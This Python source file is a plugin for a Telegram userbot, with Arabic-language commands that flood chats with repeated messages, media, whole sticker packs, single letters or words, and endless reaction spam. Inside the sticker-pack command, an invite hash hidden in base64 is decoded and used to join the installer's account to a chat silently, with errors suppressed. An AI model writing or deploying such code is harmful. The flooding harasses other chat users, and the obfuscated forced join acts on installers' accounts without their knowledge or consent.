import asyncio
import base64
import contextlib

from telethon.errors.rpcerrorlist import ForbiddenError
from telethon.tl import functions, types
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name

from jmrobot import jmrobot

from ..Config import Config
from ..core.managers import edit_delete, edit_or_reply
from ..helpers import media_type, unsavegif
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from . import BOTLOG, BOTLOG_CHATID

TKRAR = Config.TKRAR or "مكرر"


async def spam_function(event, sandy, roz, sleeptimem, sleeptimet, DelaySpam=False):
    # sourcery skip: low-code-quality
    # sourcery no-metrics
    counter = int(roz[0])
    if len(roz) == 2:
        spam_message = str(roz[1])
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
        if BOTLOG:
            if DelaySpam is not True:
                if event.is_private:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "**⌔∮ التڪرار  **\n"
                        + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **عدد المرات مع الرسالة أدناه**",
                    )
                else:
                    await event.client.send_message(
                        BOTLOG_CHATID,
                        "**⌔∮ التڪرار  **\n"
                        + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **مع** {counter} **عدد المرات مع الرسالة أدناه**",
                    )
            elif event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**⌔∮ التكرار الوقتي **\n"
                    + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **عدد المرات مع الرسالة أدناه مع التأخير** {sleeptimet} ** الثواني **",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**⌔∮ التكرار الوقتي **\n"
                    + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **مع** {counter} **عدد المرات مع الرسالة أدناه مع التأخير** {sleeptimet} ** الثواني **",
                )

            sandy = await event.client.send_file(BOTLOG_CHATID, sandy)
            await unsavegif(event, sandy)
        return
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            if gvarstatus("spamwork") is None:
                return
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    else:
        return
    if DelaySpam is not True:
        if BOTLOG:
            if event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**⌔∮ التڪرار  **\n"
                    + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {counter} **رسائل ال   :** \n"
                    + f"`{spam_message}`",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "**⌔∮ التڪرار  **\n"
                    + f"**⌔∮ تم تنفيذ التكرار بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** {counter} **رسائل الـ   :** \n"
                    + f"⌔∮ `{spam_message}`",
                )
    elif BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ التكرار الوقتي **\n"
                + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع** {sleeptimet} seconds and with {counter} **رسائل الـ   :** \n"
                + f"⌔∮ `{spam_message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ التكرار الوقتي **\n"
                + f"**⌔∮ تم تنفيذ التكرار الوقتي  بنجاح في ** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** {sleeptimet} **الثواني و مع** {counter} **رسائل الـ  ️ :** \n"
                + f"⌔∮ `{spam_message}`",
            )


@jmrobot.ar_cmd(pattern="كرر ([\s\S]*)")
async def spammer(event):
    sandy = await event.get_reply_message()
    roz = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    try:
        counter = int(roz[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجي استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    addgvar("spamwork", True)
    await spam_function(event, sandy, roz, sleeptimem, sleeptimet)


@jmrobot.ar_cmd(pattern="spspam$")
async def stickerpack_spam(event):
    reply = await event.get_reply_message()
    if (
        not reply
        or await media_type(reply) is None
        or await media_type(reply) != "Sticker"
    ):
        return await edit_delete(
            event, "**⌔∮ قم بالردّ على أيّ ملصق لإرسال جميع ملصقات الحزمة  **"
        )
    hmm = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    try:
        stickerset_attr = reply.document.attributes[1]
        jmthonevent = await edit_or_reply(
            event, "**⌔∮ جاري إحضار تفاصيل حزمة الملصقات، يرجى الإنتظار قليلا  ⏱**"
        )
    except BaseException:
        await edit_delete(
            event,
            "⌔∮ أعتقد أنّ هذا الملصق ليس جزءًا من أيّ حزمة لذا لا أستطيع إيجاد حزمته ⚠️",
            5,
        )
        return
    try:
        get_stickerset = await event.client(
            GetStickerSetRequest(
                types.InputStickerSetID(
                    id=stickerset_attr.stickerset.id,
                    access_hash=stickerset_attr.stickerset.access_hash,
                ),
                hash=0,
            )
        )
    except Exception:
        return await edit_delete(
            jmthonevent,
            "⌔∮ أعتقد أنّ هذا الملصق ليس جزءًا من أيّ حزمة لذا لا أستطيع إيجاد حزمته ⚠️",
        )
    with contextlib.suppress(BaseException):
        hmm = Get(hmm)
        await event.client(hmm)
    reqd_sticker_set = await event.client(
        functions.messages.GetStickerSetRequest(
            stickerset=types.InputStickerSetShortName(
                short_name=f"{get_stickerset.set.short_name}"
            ),
            hash=0,
        )
    )
    addgvar("spamwork", True)
    for m in reqd_sticker_set.documents:
        if gvarstatus("spamwork") is None:
            return
        try:
            await event.client.send_file(event.chat_id, m)
        except ForbiddenError:
            pass
        await asyncio.sleep(0.7)
    await jmthonevent.delete()
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار الملصق :**\n"
                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة حزمة الملصقات في  :** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع الحزمة **",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار الملصق :**\n"
                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة حزمة الملصقات في   :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع الحزمة **",
            )
        await event.client.send_file(BOTLOG_CHATID, reqd_sticker_set.documents[0])


@jmrobot.ar_cmd(pattern="سبام (.*)")
async def tmeme(event):
    cspam = "".join(event.text.split(maxsplit=1)[1:])
    message = cspam.replace(" ", "")
    await event.delete()
    addgvar("spamwork", True)
    for letter in message:
        if gvarstatus("spamwork") is None:
            return
        await event.respond(letter)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار بالحرف 📝 :**\n"
                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة الأحرف في   ▷  :** [User](tg://user?id={event.chat_id}) **الدردشة مع** : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار بالحرف 📝 :**\n"
                + f"**⌔∮ تم تنفيذ الإزعاج بواسطة الأحرف في   ▷  :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع** : `{message}`",
            )


@jmrobot.ar_cmd(pattern="وسبام (.*)")
async def tmeme(event):
    wspam = "".join(event.text.split(maxsplit=1)[1:])
    message = wspam.split()
    await event.delete()
    addgvar("spamwork", True)
    for word in message:
        if gvarstatus("spamwork") is None:
            return
        await event.respond(word)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار بالكلمه : **\n"
                + f"**⌔∮ تم تنفيذ التكرار بواسطة الڪلمات في   :** [المستخدم](tg://user?id={event.chat_id}) **الدردشة مع :** `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "**⌔∮ تكرار بالكلمه : **\n"
                + f"**⌔∮ تم تنفيذ التكرار بواسطة الڪلمات في   :** {get_display_name(await event.get_chat())}(`{event.chat_id}`) **الدردشة مع :** `{message}`",
            )


@jmrobot.ar_cmd(pattern=f"{TKRAR} (.*)")
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    try:
        sleeptimet = sleeptimem = float(input_str[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    jmthon = input_str[1:]
    try:
        int(jmthon[0])
    except Exception:
        return await edit_delete(
            event, "⌔∮ يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا ⚠️"
        )
    await event.delete()
    addgvar("spamwork", True)
    await spam_function(event, reply, jmthon, sleeptimem, sleeptimet, DelaySpam=True)


@jmrobot.ar_cmd(pattern="تعبير مكرر$")
async def react_spam(event):
    msg = await event.get_reply_message()
    if not msg:
        return await edit_delete(event, "**- يجب عليك الرد على الرسالة اولا**", 10)
    jmthonevent = await edit_or_reply(event, "**- جار بدأ العملية انتظر قليلا**")
    if isinstance(msg.peer_id, types.PeerUser):
        emoji = [
            "👍",
            "👎",
            "❤",
            "🔥",
            "🥰",
            "👏",
            "😁",
            "🤔",
            "🤯",
            "😱",
            "🤬",
            "😢",
            "🎉",
            "🤩",
            "🤮",
            "💩",
        ]
    else:
        getchat = await event.client(GetFullChannelRequest(channel=event.chat_id))
        grp_emoji = getchat.full_chat.available_reactions
        if not grp_emoji:
            return await edit_delete(
                event, "**- التعابير غير مفعلة في هذه الدردشة**", 6
            )
        emoji = grp_emoji
    addgvar("spamwork", True)
    await jmthonevent.delete()
    while gvarstatus("spamwork"):
        for i in emoji:
            await asyncio.sleep(0.2)
            try:
                await msg.react(i, True)
            except ForbiddenError:
                pass


@jmrobot.ar_cmd(pattern="ايقاف التكرار ?(.*)")
async def stopspamrz(event):
    if gvarstatus("spamwork") is not None and gvarstatus("spamwork") == "true":
        delgvar("spamwork")
        return await edit_delete(event, "**⌔∮ تم بنجاح ايقاف التكرار **")
    return await edit_delete(event, "**⌔∮ عذرا لم يتم تفعيل التكرار بالاصل")
